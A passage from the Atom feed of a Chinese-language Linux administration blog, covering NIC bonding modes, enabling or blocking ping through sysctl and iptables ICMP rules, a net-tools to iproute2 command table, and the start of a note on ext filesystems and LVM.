&#x4E0D;&#x4F1A;&#x88AB;switch(&#x4EA4;&#x6362;&#x673A;)&#x963B;&#x622A;&#x3002;<br>&#x5FC5;&#x8981;&#x6761;&#x4EF6;&#xFF1A;&#x6761;&#x4EF6;1&#xFF1A;ethtool&#x652F;&#x6301;&#x83B7;&#x53D6;&#x6BCF;&#x4E2A;slave&#x7684;&#x901F;&#x7387;&#xFF1B;&#x6761;&#x4EF6;2&#xFF1A;&#x5E95;&#x5C42;&#x9A71;&#x52A8;&#x652F;&#x6301;&#x8BBE;&#x7F6E;&#x67D0;&#x4E2A;&#x8BBE;&#x5907;&#x7684;&#x786C;&#x4EF6;&#x5730;&#x5740;&#xFF0C;&#x4ECE;&#x800C;&#x4F7F;&#x5F97;&#x603B;&#x662F;&#x6709;&#x4E2A;slave(curr_active_slave)&#x4F7F;&#x7528;bond&#x7684;&#x786C;&#x4EF6;&#x5730;&#x5740;&#xFF0C;&#x540C;&#x65F6;&#x4FDD;&#x8BC1;&#x6BCF;&#x4E2A; bond &#x4E2D;&#x7684;slave&#x90FD;&#x6709;&#x4E00;&#x4E2A;&#x552F;&#x4E00;&#x7684;&#x786C;&#x4EF6;&#x5730;&#x5740;&#x3002;&#x5982;&#x679C;curr_active_slave&#x51FA;&#x6545;&#x969C;&#xFF0C;&#x5B83;&#x7684;&#x786C;&#x4EF6;&#x5730;&#x5740;&#x5C06;&#x4F1A;&#x88AB;&#x65B0;&#x9009;&#x51FA;&#x6765;&#x7684; curr_active_slave&#x63A5;&#x7BA1;&#x5176;&#x5B9E;mod=6&#x4E0E;mod=0&#x7684;&#x533A;&#x522B;&#xFF1A;mod=6&#xFF0C;&#x5148;&#x628A;eth0&#x6D41;&#x91CF;&#x5360;&#x6EE1;&#xFF0C;&#x518D;&#x5360;eth1&#xFF0C;&#x2026;.ethX&#xFF1B;&#x800C;mod=0&#x7684;&#x8BDD;&#xFF0C;&#x4F1A;&#x53D1;&#x73B0;2&#x4E2A;&#x53E3;&#x7684;&#x6D41;&#x91CF;&#x90FD;&#x5F88;&#x7A33;&#x5B9A;&#xFF0C;&#x57FA;&#x672C;&#x4E00;&#x6837;&#x7684;&#x5E26;&#x5BBD;&#x3002;&#x800C;mod=6&#xFF0C;&#x4F1A;&#x53D1;&#x73B0;&#x7B2C;&#x4E00;&#x4E2A;&#x53E3;&#x6D41;&#x91CF;&#x5F88;&#x9AD8;&#xFF0C;&#x7B2C;2&#x4E2A;&#x53E3;&#x53EA;&#x5360;&#x4E86;&#x5C0F;&#x90E8;&#x5206;&#x6D41;&#x91CF;</li></ul></li></ul><hr><p>&#x53C2;&#x8003;&#x94FE;&#x63A5;&#xFF1A;<br><a href="https://www.jianshu.com/p/793b0138a3ef" target="_blank" rel="noopener">https://www.jianshu.com/p/793b0138a3ef</a><br><a href="https://chegva.com/2506.html" target="_blank" rel="noopener">https://chegva.com/2506.html</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Linux&amp;#x7F51;&amp;#x5361;&amp;#x805A;&amp;#x5408;&amp;#x914D;&amp;#x7F6E;&quot;&gt;&lt;a href=&quot;#Linux&amp;#x7F51;&amp;#x5361;&amp;#x805A;&amp;#x5408;&amp;#x914D;&amp;#x7F6E;&quot; class=&quot;heade
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux禁止和开启ping的方法</title>
    <link href="https://marnm.github.io//posts/be846aea/"/>
    <id>https://marnm.github.io//posts/be846aea/</id>
    <published>2022-06-07T04:40:03.000Z</published>
    <updated>2022-06-07T05:20:49.584Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ping-&#x539F;&#x7406;"><a href="#ping-&#x539F;&#x7406;" class="headerlink" title="ping &#x539F;&#x7406;"></a>ping &#x539F;&#x7406;</h2><p>&#x7F51;&#x7EDC;&#x4E0A;&#x7684;&#x673A;&#x5668;&#x90FD;&#x6709;&#x552F;&#x4E00;&#x786E;&#x5B9A;&#x7684;IP&#x5730;&#x5740;&#xFF0C;&#x6211;&#x4EEC;&#x7ED9;&#x76EE;&#x6807;IP&#x5730;&#x5740;&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5305;&#xFF0C;&#x5BF9;&#x65B9;&#x5C31;&#x8981;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x540C;&#x6837;&#x5927;&#x5C0F;&#x7684;&#x6570;&#x636E;&#x5305;&#xFF0C;&#x6839;&#x636E;&#x8FD4;&#x56DE;&#x7684;&#x6570;&#x636E;&#x5305;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x786E;&#x5B9A;&#x76EE;&#x6807;&#x4E3B;&#x673A;&#x7684;&#x5B58;&#x5728;&#xFF0C;&#x53EF;&#x4EE5;&#x521D;&#x6B65;&#x5224;&#x65AD;&#x76EE;&#x6807;&#x4E3B;&#x673A;&#x7684;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7B49;&#x3002;</p><p>ping&#x547D;&#x4EE4;&#x4E00;&#x822C;&#x7528;&#x4E8E;&#x68C0;&#x6D4B;&#x7F51;&#x7EDC;&#x901A;&#x4E0E;&#x4E0D;&#x901A;&#xFF0C;&#x4E5F;&#x53EB;&#x65F6;&#x5EF6;&#xFF08;&#x7F51;&#x7EDC;&#x4E00;&#x7AEF;&#x4F20;&#x9001;&#x5230;&#x53E6;&#x4E00;&#x7AEF;&#x9700;&#x8981;&#x7684;&#x65F6;&#x95F4;&#xFF09;&#xFF0C;&#x5176;&#x503C;&#x8D8A;&#x5927;&#xFF0C;&#x901F;&#x5EA6;&#x8D8A;&#x6162; ping (Packet Internet Grope)&#xFF0C;&#x56E0;&#x7279;&#x7F51;&#x5305;&#x63A2;&#x7D22;&#x5668;&#xFF0C;&#x7528;&#x4E8E;&#x6D4B;&#x8BD5;&#x7F51;&#x7EDC;&#x8FDE;&#x63A5;&#x91CF;&#x7684;&#x7A0B;&#x5E8F;&#x3002;</p><p>ping&#x53D1;&#x9001;&#x4E00;&#x4E2A;ICMP&#x56DE;&#x58F0;&#x8BF7;&#x6C42;&#x6D88;&#x606F;&#x7ED9;&#x76EE;&#x7684;&#x5730;&#x5E76;&#x62A5;&#x544A;&#x662F;&#x5426;&#x6536;&#x5230;&#x6240;&#x5E0C;&#x671B;&#x7684;ICMP&#x56DE;&#x58F0;&#x5E94;&#x7B54;&#x3002;&#x5B83;&#x662F;&#x7528;&#x6765;&#x68C0;&#x67E5;&#x7F51;&#x7EDC;&#x662F;&#x5426;&#x901A;&#x7545;&#x6216;&#x8005;&#x7F51;&#x7EDC;&#x8FDE;&#x63A5;&#x901F;&#x5EA6;&#x7684;&#x547D;&#x4EE4;&#x3002;</p><h2 id="ping&#x7684;&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;"><a href="#ping&#x7684;&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;" class="headerlink" title="ping&#x7684;&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;"></a>ping&#x7684;&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;</h2><p>1&#x3001;&#x5728;&#x540C;&#x4E00;&#x7F51;&#x6BB5;&#x5185;</p><pre><code>ping</code></pre><p>&#x4E3B;&#x673A;A&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&gt;&#x4E3B;&#x673A;B<br>ICMP&#x8BF7;&#x6C42;&#x5305;  </p><ul><li>&#x5728;&#x672C;&#x673A;(&#x4E3B;&#x673A;A)&#x67E5;&#x627E;ARP&#x7F13;&#x5B58;&#x8868;&#x67E5;&#x627E;&#x4E3B;&#x673A;B&#x7684;IP&#x4E0E;&#x5176;&#x5BF9;&#x5E94;&#x7684;MAC</li><li>&#x6CA1;&#x6709;&#x627E;&#x5230;&#x4E3B;&#x673A;B&#x7684;IP&#x4E0E;&#x5176;MAC&#x7684;&#x6620;&#x5C04;&#x5173;&#x7CFB;&#xFF0C;&#x5219;&#x53D1;&#x9001;&#x4E00;&#x4E2A;arp (&#x6839;&#x636E;IP&#x5730;&#x5740;&#x83B7;&#x53D6;&#x7269;&#x7406;&#x5730;&#x5740;&#x7684;&#x4E00;&#x4E2A;TCP/IP&#x534F;&#x8BAE;) &#x8BF7;&#x6C42;&#x5E7F;&#x64AD;</li><li>&#x4E3B;&#x673A;B&#x63A5;&#x6536;&#x5230;arp&#x8BF7;&#x6C42;&#x5305;&#x540E;&#xFF0C;&#x56DE;&#x590D;&#x4E00;&#x4E2A;arp&#x5E94;&#x7B54;&#x5305;(&#x91CC;&#x9762;&#x5305;&#x542B;&#x672C;&#x673A;MAC)</li></ul><p>&#x4E3B;&#x673A;A&lt;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;-&#x4E3B;&#x673A;B<br>ICMP&#x5E94;&#x7B54;&#x5305;</p><p>2&#x3001;&#x4E0D;&#x5728;&#x540C;&#x4E00;&#x7F51;&#x6BB5;</p><p>&#x5728;&#x4E3B;&#x673A;A&#x4E0A;&#x8FD0;&#x884C;&#x201C;ping&#x4E3B;&#x673A;C(&#x4E0D;&#x5728;&#x540C;&#x4E00;&#x7F51;&#x6BB5;)&#x201D;&#x540E;&#xFF0C;&#x5F00;&#x59CB;&#x8DDF;&#x4E0A;&#x9762;&#x4E00;&#x6837;&#xFF0C;&#x5230;&#x4E86;&#x600E;&#x6837;&#x5F97;&#x5230;MAC&#x5730;&#x5740;&#x65F6;&#xFF0C;IP&#x534F;&#x8BAE;&#x901A;&#x8FC7;&#x8BA1;&#x7B97;&#x53D1;&#x73B0;C&#x673A;&#x4E0E;&#x81EA;&#x5DF1;&#x4E0D;&#x5728;&#x540C;&#x4E00;&#x7F51;&#x6BB5;&#x5185;&#xFF0C;&#x5C31;&#x76F4;&#x63A5;&#x4EA4;&#x7ED9;&#x8DEF;&#x7531;&#x5668;&#x5904;&#x7406;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5C06;&#x8DEF;&#x7531;&#x7684;MAC&#x53D6;&#x8FC7;&#x6765;&#xFF0C;&#x81F3;&#x4E8E;&#x600E;&#x6837;&#x5F97;&#x5230;&#x8DEF;&#x7531;&#x7684;MAC&#xFF0C;&#x8DDF;&#x4E0A;&#x9762;&#x4E00;&#x6837;&#xFF0C;<strong>&#x5148;&#x5728;ARP&#x7F13;&#x5B58;&#x8868;&#x627E;&#xFF0C;&#x627E;&#x4E0D;&#x5230;&#x5C31;&#x5E7F;&#x64AD;&#x5305;&#x3002;&#x8DEF;&#x7531;&#x5F97;&#x5230;&#x8FD9;&#x4E2A;&#x6570;&#x636E;&#x5E27;&#x540E;&#xFF0C;&#x518D;&#x8DDF;&#x4E3B;&#x673A;C&#x8FDB;&#x884C;&#x8054;&#x7CFB;&#xFF0C;&#x5982;&#x679C;&#x627E;&#x4E0D;&#x5230;&#xFF0C;&#x5C31;&#x5411;&#x4E3B;&#x673A;A&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x8D85;&#x65F6;&#x7684;&#x4FE1;&#x606F;</strong>&#x3002;</p><p>Linux&#x9ED8;&#x8BA4;&#x662F;&#x5141;&#x8BB8;Ping&#x54CD;&#x5E94;&#x7684;&#xFF0C;&#x7CFB;&#x7EDF;&#x662F;&#x5426;&#x5141;&#x8BB8;Ping&#x7531;2&#x4E2A;&#x56E0;&#x7D20;&#x51B3;&#x5B9A;&#x7684;&#xFF1A;A&#x3001;&#x5185;&#x6838;&#x53C2;&#x6570;&#xFF0C;B&#x3001;&#x9632;&#x706B;&#x5899;&#xFF0C;&#x9700;&#x8981;2&#x4E2A;&#x56E0;&#x7D20;&#x540C;&#x65F6;&#x5141;&#x8BB8;&#x624D;&#x80FD;&#x5141;&#x8BB8;Ping&#xFF0C;2&#x4E2A;&#x56E0;&#x7D20;&#x6709;&#x4EFB;&#x610F;&#x4E00;&#x4E2A;&#x7981;Ping&#x5C31;&#x65E0;&#x6CD5;Ping&#x3002;</p><p>&#x5177;&#x4F53;&#x7684;&#x914D;&#x7F6E;&#x65B9;&#x6CD5;</p><p>&#x5185;&#x6838;&#x53C2;&#x6570;&#x8BBE;&#x7F6E;</p><p>1&#x3001;&#x5141;&#x8BB8;PING&#x8BBE;&#x7F6E;</p><p>A. &#x4E34;&#x65F6;&#x5141;&#x8BB8;PING&#x64CD;&#x4F5C;&#x7684;&#x547D;&#x4EE4;&#x4E3A;&#xFF1A;<code>echo 0 &gt;/proc/sys/net/ipv4/icmp_echo_ignore_all</code></p><p>B. &#x6C38;&#x4E45;&#x5141;&#x8BB8;PING&#x914D;&#x7F6E;&#x65B9;&#x6CD5;&#x3002;<br>  &#x5728; /etc/sysctl.conf &#x4E2D;&#x589E;&#x52A0;&#x4E00;&#x884C;<br>  net.ipv4.icmp_echo_ignore_all=0<br>  &#x5982;&#x679C;&#x5DF2;&#x7ECF;&#x6709;net.ipv4.icmp_echo_ignore_all&#x8FD9;&#x4E00;&#x884C;&#x4E86;&#xFF0C;&#x76F4;&#x63A5;&#x4FEE;&#x6539;=&#x53F7;&#x540E;&#x9762;&#x7684;&#x503C;&#x5373;&#x53EF;&#x7684;&#xFF08;0&#x8868;&#x793A;&#x5141;&#x8BB8;&#xFF0C;1&#x8868;&#x793A;&#x7981;&#x6B62;&#xFF09;&#x3002;<br>   &#x4FEE;&#x6539;&#x5B8C;&#x6210;&#x540E;&#x6267;&#x884C;sysctl -p&#x4F7F;&#x65B0;&#x914D;&#x7F6E;&#x751F;&#x6548;&#x3002;</p><p>2&#x3001;&#x7981;&#x6B62;Ping&#x8BBE;&#x7F6E;     </p><p>A.&#x4E34;&#x65F6;&#x7981;&#x6B62;PING&#x7684;&#x547D;&#x4EE4;&#x4E3A;&#xFF1A;echo 1 &gt;/proc/sys/net/ipv4/icmp_echo_ignore_all     </p><p>B.&#x6C38;&#x4E45;&#x7981;&#x6B62;PING&#x914D;&#x7F6E;&#x65B9;&#x6CD5;&#x3002;<br>   /etc/sysctl.conf &#x4E2D;&#x589E;&#x52A0;&#x4E00;&#x884C;<br>   net.ipv4.icmp_echo_ignore_all=1<br>   &#x5982;&#x679C;&#x5DF2;&#x7ECF;&#x6709;net.ipv4.icmp_echo_ignore_all&#x8FD9;&#x4E00;&#x884C;&#x4E86;&#xFF0C;&#x76F4;&#x63A5;&#x4FEE;&#x6539;=&#x53F7;&#x540E;&#x9762;&#x7684;&#x503C;&#x5373;&#x53EF;&#x7684;&#x3002;&#xFF08;0&#x8868;&#x793A;&#x5141;&#x8BB8;&#xFF0C;1&#x8868;&#x793A;&#x7981;&#x6B62;&#xFF09;<br>   &#x4FEE;&#x6539;&#x5B8C;&#x6210;&#x540E;&#x6267;&#x884C;sysctl -p&#x4F7F;&#x65B0;&#x914D;&#x7F6E;&#x751F;&#x6548;&#x3002;</p><p>&#x9632;&#x706B;&#x5899;&#x8BBE;&#x7F6E;</p><p>&#x6CE8;&#xFF1A;&#x6B64;&#x5904;&#x7684;&#x65B9;&#x6CD5;&#x7684;&#x524D;&#x63D0;&#x662F;&#x5185;&#x6838;&#x914D;&#x7F6E;&#x662F;&#x9ED8;&#x8BA4;&#x503C;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6CA1;&#x6709;&#x7981;&#x6B62;ping<br>&#x8FD9;&#x91CC;&#x4EE5;iptables&#x9632;&#x706B;&#x5899;&#x4E3A;&#x4F8B;&#xFF0C;&#x5176;&#x4ED6;&#x9632;&#x706B;&#x5899;&#x64CD;&#x4F5C;&#x65B9;&#x6CD5;&#x53EF;&#x53C2;&#x8003;&#x9632;&#x706B;&#x5899;&#x7684;&#x5B98;&#x65B9;&#x6587;&#x6863;&#x3002;</p><p>1&#x3001;&#x5141;&#x8BB8;PING&#x8BBE;&#x7F6E;      </p><pre><code> iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT iptables -A OUTPUT -p icmp --icmp-type echo-reply -j ACCEPT</code></pre><p>2&#x3001;&#x7981;&#x6B62;PING&#x8BBE;&#x7F6E;</p><pre><code> iptables -A INPUT -p icmp --icmp-type echo-request -j DROP iptables -A OUTPUT -p icmp --icmp-type echo-reply -j DROP iptables -A INPUT -p icmp --icmp-type 8 -s 0/0 -j DROP --icmp-type 8 echo request&#x2014;&#x2014;&#x56DE;&#x663E;&#x8BF7;&#x6C42;&#xFF08;ping&#x8BF7;&#x6C42;&#xFF09; 0/0 &#x6240;&#x6709; IP iptables -A INPUT -p icmp --icmp-type 8 -j DROP iptables -A INPUT -p icmp --icmp-type 0 -j DROP 0  Echo Reply&#x2014;&#x2014;&#x56DE;&#x663E;&#x5E94;&#x7B54;&#xFF08;Ping&#x5E94;&#x7B54;&#xFF09; 8  Echo request&#x2014;&#x2014;&#x56DE;&#x663E;&#x8BF7;&#x6C42;&#xFF08;Ping&#x8BF7;&#x6C42;&#xFF09;</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ping-&amp;#x539F;&amp;#x7406;&quot;&gt;&lt;a href=&quot;#ping-&amp;#x539F;&amp;#x7406;&quot; class=&quot;headerlink&quot; title=&quot;ping &amp;#x539F;&amp;#x7406;&quot;&gt;&lt;/a&gt;ping &amp;#x539F;&amp;#x7406;&lt;/
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>iproute2工具包</title>
    <link href="https://marnm.github.io//posts/1ebd4a76/"/>
    <id>https://marnm.github.io//posts/1ebd4a76/</id>
    <published>2022-06-07T04:39:38.000Z</published>
    <updated>2022-06-07T05:21:04.448Z</updated>
    
    <content type="html"><![CDATA[<h1 id="iproute2-&#x5DE5;&#x5177;"><a href="#iproute2-&#x5DE5;&#x5177;" class="headerlink" title="iproute2 &#x5DE5;&#x5177;"></a>iproute2 &#x5DE5;&#x5177;</h1><table><thead><tr><th>net-tools</th><th>iproute2</th></tr></thead><tbody><tr><td>arp -na</td><td>ip neigh</td></tr><tr><td>ifconfig</td><td>ip link</td></tr><tr><td>ifconfig -a</td><td>ip addr show</td></tr><tr><td>ifconfig &#x2013;help</td><td>ip help</td></tr><tr><td>ifconfig -eth0 up</td><td>ip link set eth0 up</td></tr><tr><td>ipmaddr</td><td>ip maddr</td></tr><tr><td>iptunnel</td><td>ip tunnel</td></tr><tr><td>netstat</td><td>ss</td></tr><tr><td>netstat -i</td><td>ip -s link</td></tr><tr><td>netstat -g</td><td>ip maddr</td></tr><tr><td>netstat -l</td><td>ss -l</td></tr><tr><td>netstat -r</td><td>ip route</td></tr><tr><td>route add</td><td>ip route add</td></tr><tr><td>route del</td><td>ip route del</td></tr><tr><td>route -n</td><td>ip route show</td></tr><tr><td>vconfig</td><td>ip link</td></tr></tbody></table><table><thead><tr><th>iproute2</th><th>net-tools</th><th>Notes</th></tr></thead><tbody><tr><td>ip link show</td><td>ifconfig -a</td><td>&#x663E;&#x793A;&#x6240;&#x6709;&#x7F51;&#x5361;</td></tr><tr><td>ip link set down/up eth0</td><td>ifconfig eth0 up/down</td><td>&#x542F;&#x52A8;/&#x5173;&#x95ED;&#x7F51;&#x5361;</td></tr><tr><td>ip addr add 192.168.0.10/24 dev eth0</td><td>ifconfig eth0 192.168.0.10/24</td><td>&#x5728;eth0&#x4E0A;&#x6DFB;&#x52A0;IP&#x5730;&#x5740;</td></tr><tr><td>ip addr del 192.168.0.10/24 dev eth0</td><td>ifconfig eth0 0</td><td>&#x5220;&#x9664;eth0&#x7684;IP&#x5730;&#x5740;</td></tr><tr><td>ip addr show dev eth0</td><td>ifconfig eth0</td><td>&#x67E5;&#x770B;eth0&#x7684;&#x7F51;&#x7EDC;&#x914D;&#x7F6E;&#x4FE1;&#x606F;</td></tr><tr><td>ip -6 addr add fe80::f0b7:57ff:fe2f:5f0d/64 dev eth1</td><td>ifconfig eth1 inet6 add fe80::f0b7:57ff:fe2f:5f0d/64</td><td>&#x5728;eth1&#x4E0A;&#x6DFB;&#x52A0;IPv6&#x5730;&#x5740;</td></tr><tr><td>ip -6 addr show dev eth0</td><td>ifconfig eth0</td><td>&#x67E5;&#x770B;IPv6&#x5730;&#x5740;</td></tr><tr><td>ip link set dev eth0 address 02:42:20:d2:28:36</td><td>ifconfig eth0 hw ether 02:42:20:d2:28:36</td><td>&#x914D;&#x7F6E;MAC&#x5730;&#x5740;</td></tr><tr><td>ip route show</td><td>route -n</td><td>&#x67E5;&#x770B;&#x8DEF;&#x7531;&#x8868;&#x4FE1;&#x606F;</td></tr><tr><td>ip route add default via 192.168.0.1 dev eth0</td><td>route add default gw 192.168.0.1 eth0</td><td>&#x6DFB;&#x52A0;&#x9ED8;&#x8BA4;&#x8DEF;&#x7531;</td></tr><tr><td>ip roue replace default via 192.168.0.1 dev ens33</td><td>route del default gw 192.168.0.1 ens33</td><td>&#x5220;&#x9664;&#x9ED8;&#x8BA4;&#x8DEF;&#x7531;</td></tr><tr><td>ip route add 10.24.32.0/24 via 192.168.0.1 dev ens33</td><td>route add -net 10.24.32.0/24 gw 192.168.0.1 dev ens33</td><td>&#x6DFB;&#x52A0;&#x9759;&#x6001;&#x8DEF;&#x7531;</td></tr><tr><td>ip route del 192.168.10.0/24</td><td>route del -net 192.168.10.0/24</td><td>&#x5220;&#x9664;&#x9759;&#x6001;&#x8DEF;&#x7531;</td></tr><tr><td>ss</td><td>netstat</td><td>&#x67E5;&#x770B;tcp/udp&#x7684;scoket&#x76D1;&#x542C;&#x4FE1;&#x606F;</td></tr><tr><td>arp -an</td><td>ip neigh</td><td>&#x67E5;&#x770B;ARP&#x8868;</td></tr><tr><td>bridge</td><td>brctl</td><td>&#x7BA1;&#x7406;bridge&#x5730;&#x5740;&#x548C;device</td></tr></tbody></table><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;iproute2-&amp;#x5DE5;&amp;#x5177;&quot;&gt;&lt;a href=&quot;#iproute2-&amp;#x5DE5;&amp;#x5177;&quot; class=&quot;headerlink&quot; title=&quot;iproute2 &amp;#x5DE5;&amp;#x5177;&quot;&gt;&lt;/a&gt;iproute2 &amp;#
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>LVM磁盘管理</title>
    <link href="https://marnm.github.io//posts/38cc96c8/"/>
    <id>https://marnm.github.io//posts/38cc96c8/</id>
    <published>2022-06-07T04:39:21.000Z</published>
    <updated>2022-06-07T05:21:22.680Z</updated>
    
    <content type="html"><![CDATA[<h3 id="EXT&#x6269;&#x5C55;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#xFF08;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#xFF09;"><a href="#EXT&#x6269;&#x5C55;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#xFF08;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#xFF09;" class="headerlink" title="EXT&#x6269;&#x5C55;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#xFF08;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#xFF09;"></a>EXT&#x6269;&#x5C55;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#xFF08;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#xFF09;</h3><p>ext2&#x3001;ext3&#xFF1A;linux&#x73AF;&#x5883;&#x4E0A;&#x7684;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x3002;ext2/ext3&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x8282;&#x70B9;&#x6765;&#x8BB0;&#x5F55;&#x6587;&#x4EF6;&#x4FE1;&#x606F;&#xFF0C;&#x4F5C;&#x7528;&#x5C31;&#x50CF;Windows&#x7684;&#x6587;&#x4EF6;&#x5206;&#x914D;&#x8868;&#x3002;&#x7D22;&#x5F15;&#x8282;&#x70B9;&#x662F;&#x4E00;&#x4E2A;&#x7ED3;&#x6784;&#xFF0C;&#x5B83;&#x5305;&#x542B;&#x4E86;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#x957F;&#x5EA6;&#x3001;&#x521B;&#x5EFA;&#x53CA;&#x4FEE;&#x6539;&#x65F6;&#x95F4;&#x3001;&#x6743;&#x9650;&#x3001;&#x6240;&#x5C5E;&#x5173;&#x7CFB;&#x3001;&#x78C1;&#x76D8;&#x4E2D;&#x7684;&#x4F4D;&#x7F6E;&#x7B49;&#x4FE1;&#x606F;</p><p>ext2&#x3001;ext3&#x7684;&#x533A;&#x522B;&#x5982;&#x4E0B;&#xFF1A;<br>ext2&#x548C;ext3&#x7684;&#x683C;&#x5F0F;&#x5B8C;&#x5168;&#x76F8;&#x540C;&#xFF0C;&#x77E5;&#x8BC6;&#x5728;ext3&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x6700;&#x540E;&#x9762;&#x6709;&#x4E00;&#x90E8;&#x5206;&#x7A7A;&#x95F4;&#x7528;&#x6765;&#x5B58;&#x653E;journal&#xFF08;&#x65E5;&#x5FD7;&#xFF09;&#x7684;&#x8BB0;&#x5F55;<br>ext2&#x4E2D;&#xFF0C;&#x5199;&#x8D44;&#x6599;&#x5230;&#x786C;&#x76D8;&#x91CC;&#x9762;&#x65F6;&#xFF0C;&#x5148;&#x5C06;&#x8D44;&#x6599;&#x5199;&#x5165;&#x7F13;&#x5B58;&#x4E2D;&#xFF0C;&#x5F53;&#x7F13;&#x5B58;&#x5199;&#x6EE1;&#x662F;&#x624D;&#x56DE;&#x5199;&#x5165;&#x786C;&#x76D8;&#x91CC;&#x9762;<br>&#x5728;ext3&#x4E2D;&#xFF0C;&#x5199;&#x8D44;&#x6599;&#x5230;&#x786C;&#x76D8;&#x91CC;&#x9762;&#x65F6;&#xFF0C;&#x5148;&#x5C06;&#x8D44;&#x6599;&#x5199;&#x5165;&#x7F13;&#x5B58;&#x4E2D;&#xFF0C;&#x5F53;&#x7F13;&#x5B58;&#x5199;&#x6EE1;&#x65F6;&#x7CFB;&#x7EDF;&#x5148;&#x901A;&#x77E5;journal&#xFF0C;&#x518D;&#x5C06;&#x8D44;&#x6599;&#x5199;&#x5165;&#x786C;&#x76D8;&#xFF0C;&#x5B8C;&#x6210;&#x540E;&#x518D;&#x901A;&#x77E5;journal&#xFF0C;&#x8D44;&#x6599;&#x5DF2;&#x5B8C;&#x6210;&#x5199;&#x5165;&#x5DE5;&#x4F5C;</p><hr><p>&#x662F;&#x5426;&#x6709;journal&#x7684;&#x5DEE;&#x522B;<br>&#x5728;ext2&#x4E2D;&#xFF0C;&#x7CFB;&#x7EDF;&#x5F00;&#x673A;&#x65F6;&#x4F1A;&#x68C0;&#x67E5;&#x6709;&#x6548;&#x4F4D;&#xFF08;valid bit&#xFF09;&#xFF0C;&#x5982;&#x679C;&#x503C;&#x4E3A;1&#xFF0C;&#x8868;&#x793A;&#x7CFB;&#x7EDF;&#x4E0A;&#x6B21;&#x6709;&#x6B63;&#x5E38;&#x5173;&#x673A;&#xFF1B;&#x5982;&#x679C;&#x4E3A;0&#xFF0C;&#x8868;&#x793A;&#x4E0A;&#x6B21;&#x5173;&#x673A;&#x672A;&#x6B63;&#x5E38;&#x5173;&#x673A;&#xFF0C;&#x90A3;&#x7CFB;&#x7EDF;&#x5C31;&#x4F1A;&#x4ECE;&#x5934;&#x68C0;&#x67E5;&#x786C;&#x76D8;&#x4E2D;&#x7684;&#x8D44;&#x6599;&#xFF0C;&#x8FD9;&#x6837;&#x65F6;&#x95F4;&#x4F1A;&#x5F88;&#x957F;<br>&#x5728;ext3&#x4E2D;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;journal&#x673A;&#x5236;&#x91CC;&#xFF0C;&#x7CFB;&#x7EDF;&#x5F00;&#x673A;&#x65F6;&#x68C0;&#x67E5;journal&#x7684;&#x8D44;&#x6599;&#xFF0C;&#x6765;&#x67E5;&#x770B;&#x662F;&#x5426;&#x6709;&#x9519;&#x8BEF;&#x4EA7;&#x751F;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x5FEB;&#x4E86;&#x5F88;&#x591A;<br>tune2fs 